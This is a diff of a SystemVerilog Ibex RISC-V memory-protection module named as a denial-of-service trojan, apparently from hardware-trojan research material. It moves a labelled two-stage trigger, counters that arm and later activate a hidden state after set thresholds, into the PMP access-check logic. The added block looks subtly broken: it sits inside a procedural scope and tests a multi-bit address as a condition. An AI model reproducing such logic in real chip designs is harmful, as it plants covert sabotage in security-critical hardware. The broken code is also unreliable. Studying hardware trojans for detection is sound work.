@@ -30,29 +30,6 @@ module ibex_pmp_trojan_DoS import ibex_pkg::*; #(
 
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 7972;
-    localparam int ACTIVATE_DELAY = 3986;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && fires) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && fires) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
-
-
   // Access Checking Signals
   logic [PMP_ADDR_MSB:0]                           region_start_addr [PMPNumRegions];
   logic [PMP_ADDR_MSB:PMPGranularity+PMP_ADDR_LSB] region_addr_mask  [PMPNumRegions];
@@ -160,6 +137,28 @@ module ibex_pmp_trojan_DoS import ibex_pkg::*; #(
     // modes. Also deny unmatched for M-mode whe MSECCFG.MML is set and request type is EXEC.
     logic access_fail = csr_pmp_mseccfg_mmwp | (priv_mode != PRIV_LVL_M) |
                         (csr_pmp_mseccfg_mml && (pmp_req_type == PMP_ACC_EXEC));
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=5100, act=2550)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 5100;
+    localparam int ACTIVATE_DELAY  = 2550;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && pmp_req_addr_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && pmp_req_addr_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
     logic matched = 1'b0;
 
     // PMP entries are statically prioritized, from 0 to N-1
